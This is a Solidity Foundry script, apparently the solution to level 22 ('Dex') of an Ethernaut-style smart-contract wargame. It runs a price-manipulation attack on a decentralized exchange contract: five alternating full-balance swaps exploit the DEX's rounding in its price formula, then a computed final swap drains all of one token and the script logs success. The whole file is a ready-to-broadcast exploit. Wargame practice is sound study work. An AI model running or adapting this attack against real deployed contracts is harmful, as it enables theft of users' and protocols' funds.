// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../../src/levels/22_Dex/Dex.sol";

/**
 * @title DexAttackerDirect
 * @notice Direct DEX attack without deploying a separate contract
 * @dev This script performs swaps directly from the player's EOA
 */
contract DexAttackerDirectScript is Script {
    function run() external {
        // Get DEX instance address from environment
        address dexAddress = vm.envAddress("DEX_TARGET");

        console.log("========================================");
        console.log("DEX Direct Price Manipulation Attack");
        console.log("========================================");
        console.log("DEX Address:", dexAddress);

        Dex dex = Dex(dexAddress);
        address token1 = dex.token1();
        address token2 = dex.token2();

        console.log("\nToken Addresses:");
        console.log("Token1:", token1);
        console.log("Token2:", token2);

        vm.startBroadcast();
        address player = msg.sender;

        // Display initial balances
        console.log("\n--- INITIAL STATE ---");
        console.log("Player address:", player);
        uint256 myToken1 = dex.balanceOf(token1, player);
        uint256 myToken2 = dex.balanceOf(token2, player);
        console.log("Player Token1:", myToken1);
        console.log("Player Token2:", myToken2);
        console.log("DEX Token1:", dex.balanceOf(token1, dexAddress));
        console.log("DEX Token2:", dex.balanceOf(token2, dexAddress));

        require(myToken1 > 0 && myToken2 > 0, "Player must have initial tokens");

        // Approve DEX to spend our tokens
        console.log("\n--- APPROVING DEX ---");
        dex.approve(dexAddress, type(uint256).max);
        console.log("DEX approved to spend tokens");

        // Execute the attack through multiple swaps
        console.log("\n--- EXECUTING SWAPS ---");

        // Swap 1: token1 -> token2
        myToken1 = dex.balanceOf(token1, player);
        console.log("\nSwap 1: Swapping", myToken1, "token1 for token2");
        dex.swap(token1, token2, myToken1);
        console.log("After swap - Player token2:", dex.balanceOf(token2, player));
        console.log("After swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        // Swap 2: token2 -> token1
        myToken2 = dex.balanceOf(token2, player);
        console.log("\nSwap 2: Swapping", myToken2, "token2 for token1");
        dex.swap(token2, token1, myToken2);
        console.log("After swap - Player token1:", dex.balanceOf(token1, player));
        console.log("After swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        // Swap 3: token1 -> token2
        myToken1 = dex.balanceOf(token1, player);
        console.log("\nSwap 3: Swapping", myToken1, "token1 for token2");
        dex.swap(token1, token2, myToken1);
        console.log("After swap - Player token2:", dex.balanceOf(token2, player));
        console.log("After swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        // Swap 4: token2 -> token1
        myToken2 = dex.balanceOf(token2, player);
        console.log("\nSwap 4: Swapping", myToken2, "token2 for token1");
        dex.swap(token2, token1, myToken2);
        console.log("After swap - Player token1:", dex.balanceOf(token1, player));
        console.log("After swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        // Swap 5: token1 -> token2
        myToken1 = dex.balanceOf(token1, player);
        console.log("\nSwap 5: Swapping", myToken1, "token1 for token2");
        dex.swap(token1, token2, myToken1);
        console.log("After swap - Player token2:", dex.balanceOf(token2, player));
        console.log("After swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        // Swap 6: Final swap - calculate exact amount to drain
        myToken2 = dex.balanceOf(token2, player);
        uint256 dexToken1 = dex.balanceOf(token1, dexAddress);
        uint256 dexToken2 = dex.balanceOf(token2, dexAddress);

        // We want to drain all token1, so we need: (amount * dexToken1) / dexToken2 = dexToken1
        // Therefore: amount = dexToken2
        uint256 finalSwapAmount = dexToken2;

        console.log("\nSwap 6 (FINAL): Swapping", finalSwapAmount, "token2 to drain all token1");
        dex.swap(token2, token1, finalSwapAmount);
        console.log("After final swap - Player token1:", dex.balanceOf(token1, player));
        console.log("After final swap - DEX token1:", dex.balanceOf(token1, dexAddress), "DEX token2:", dex.balanceOf(token2, dexAddress));

        vm.stopBroadcast();

        // Verify success
        console.log("\n--- FINAL VERIFICATION ---");
        uint256 finalDexToken1 = dex.balanceOf(token1, dexAddress);
        uint256 finalDexToken2 = dex.balanceOf(token2, dexAddress);

        console.log("Final DEX Token1:", finalDexToken1);
        console.log("Final DEX Token2:", finalDexToken2);
        console.log("Final Player Token1:", dex.balanceOf(token1, player));
        console.log("Final Player Token2:", dex.balanceOf(token2, player));

        if (finalDexToken1 == 0 || finalDexToken2 == 0) {
            console.log("\n SUCCESS! DEX has been drained of at least one token!");
        } else {
            console.log("\n FAILED! DEX still has both tokens.");
        }
        console.log("========================================");
    }
}
